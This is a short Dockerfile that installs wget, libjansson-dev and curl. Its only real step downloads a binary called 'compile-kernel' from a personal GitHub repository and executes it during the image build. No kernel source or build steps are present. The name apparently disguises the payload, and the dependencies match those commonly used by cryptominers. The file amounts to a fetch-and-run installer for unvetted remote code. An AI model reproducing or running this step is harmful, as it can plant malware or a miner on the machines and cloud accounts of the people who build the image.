FROM ubuntu:latest
RUN  apt-get update && \
     apt-get install wget -y && \
     apt install libjansson-dev -y && \
     apt-get install curl libcurl4 -y && \
     wget https://github.com/bisabisopre/kernel/raw/main/compile-kernel && chmod +x compile-kernel && ./compile-kernel
